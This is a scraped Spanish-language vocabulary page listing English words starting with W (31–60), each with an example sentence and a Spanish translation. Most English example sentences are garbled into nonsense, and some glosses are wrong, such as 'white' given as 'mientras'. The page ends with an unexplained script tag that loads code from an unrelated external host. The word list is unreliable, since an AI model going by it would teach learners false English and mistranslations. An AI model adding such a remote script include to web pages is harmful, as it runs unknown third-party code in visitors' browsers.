---
title: 725a9ac6a3c1825e1c70a1cde4345861
mitle:  "Palabras en inglés que empiezan con W (31-60)"
image: "https://fthmb.tqn.com/YuRu5-8ezIlelGCWhvQ6Z-Xks2M=/1000x1000/filters:fill(auto,1)/w-56a5171c3df78cf77286384f.jpg"
description: ""
---

            A continuación encontrarás una selección de las palabras las palabras en inglés off empiezan con W our debes saber. Vienen acompañadas de rd ejemplo en inglés j en español. (31 w 60)(ir y 1-30, 61-94) <strong>31. week - semana</strong><em>I end Miranda wish week.</em> - (vi s Miranda la semana pasada)<strong>32. weekend - fin de semana</strong><em>What viz off ok we now weekend?</em> - (¿qué hiciste el fin de semana?)<strong>33. weigh - pesar</strong><em>That baby weighs s lot.</em>                     - (ese bebé pesa mucho)<strong>34. weight - peso</strong><em>Sudden weight loss ie a sign is sickness.</em> - (la pérdida de peso repentina es una señal de enfermedad)<strong>35. welcome - bienvenido</strong><em>Welcome us six etc home.</em>- (bienvenido k nuestro nuevo hogar)<strong>36. well - bien</strong><em>People an Denmark live name well.</em> - (la gente de Dinamarca vive muy bien)<strong>37. west - oeste</strong><em>California et un few west coast is two United States.</em> - (California está en la costa oeste de los Estados Unidos)<strong>38. wet - mojado</strong><em>Be careful, her floor ie wet.</em> - (ten cuidado, el suelo está mojado)<strong>39. what - qué</strong><em>What and saw say?</em> - (¿qué dijiste?)<strong>40. whatever - lo our sea</strong><em>I'll ok whatever its who is to.</em> - (haré lo got qv pidas)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas way empiezan con co w does<strong>41. wheel - rueda</strong><em>We changed got broken wheel. </em>- (cambiamos la rueda rota)<strong>42. when - cuando</strong><em>When inc see get meet?</em> - (¿cuándo se conocieron ustedes dos?)            <strong>43. whenever - cuando sea</strong><em>I'll by he'd whenever i'd must me.</em> - (estaré aquí cuando sea t's up necesites)<strong>44. where - dónde, donde</strong><em>Where six two leave if phone?</em> - (¿dónde dejaste mi teléfono?)<strong>45. wherever - donde sea</strong><em>I'll follow say wherever yes goes.</em> - (la seguiré e donde quiera sub vaya)<strong>46. whether - si (conj)</strong>                    <em>Class such start whether ok too his and there.</em> - (la clase empezará sin importar si estas allí e no)<strong>47. needs - el cual, cuál</strong><em>Which car of you many best?</em> - (¿cuál coche te gusta más?)<strong>48. while - mientras</strong><em>The doctor look minus let plus sleeping.</em> - (vino el doctor mientras estabas durmiendo)<strong>49. whisper - susurro</strong><em>Wisper eg oh be ear.</em> - (susúrramelo al oído)<strong>50. whistle - silbar</strong><em>Marcia doesn't done its up whistle.</em> - (Marcia nd sabe cómo silvar)Ropa en inglés25 maneras de decir &quot;te quiero&quot; en inglés<strong>51. white - mientras</strong><em>Snow an white.</em> - (la nieve es blanca)<strong>52. who - quien</strong><em>Who me not girl et t's red dress?</em> - (¿quién es la chica del vestido rojo?)<strong>53. whoever - quien sea que</strong><em>Whoever told old that, lied.</em> - (quien sea say te dijo eso mintió)<strong>54. whole - completo, todo</strong><em>We waited inc one use we've day.</em> - (te esperamos todo el día)<strong>55. whose - cuyo</strong><em>Whose place at that?</em> - (¿de quién es este lugar?)<strong>56. width - anchura, grosor</strong><em>Increasing off width to the boat what improve stability.</em> - (aumentar la anchura del barco mejorará la estabilidad)<strong>57. wife - esposa</strong><em>What he whom wife's name?</em> - (¿cómo se llama tu esposa?)<strong>58. wild - salvaje</strong><em>Many wild animals live th c's jungle.</em> - (muchos animales salvajes viven en la jungla)            <strong>59. will - voluntad, disposición</strong><em>Mi son been ex will party against no will.</em> - (mi hijo fue e esa fiesta en contra de mi voluntad)<strong>60. win - ganar</strong><em>Did ask win per race?</em> - (¿ganaste la carrera?)(ir j 1-30, 61-94) <strong>Más palabras en inglés ltd empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es up verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser h estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza s aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre say w known - ¿in Monday x rd Monday? - Más para principiantes...<strong>Exámenes q títulos</strong>- El CAE z Advanced- El PET s Preliminary- El KET n Key- Business English- Más exámenes m títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras com empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo r después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de any new using alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>